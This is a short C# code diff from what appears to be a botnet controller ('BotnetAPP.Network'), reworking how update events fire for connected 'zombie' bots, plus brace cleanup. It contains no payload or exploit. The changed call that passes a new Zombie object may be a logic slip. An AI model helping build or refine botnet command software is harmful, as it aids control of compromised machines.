@@ -189,9 +189,8 @@ namespace BotnetAPP.Network {
                     item.Key.Key.SetAction(item.Value) ; 
 
                     _connectedBot[item.Key.Key] = item.Key.Value ;
-
-                    OnUpdateAction(item.Key.Key) ; 
                     }
+                    OnUpdateAction(new Zombie()) ; 
                 }
             }
             catch (Exception ex) {
@@ -283,7 +282,5 @@ namespace BotnetAPP.Network {
                 }
         }
     }
-
-
-    }
+  }
 }
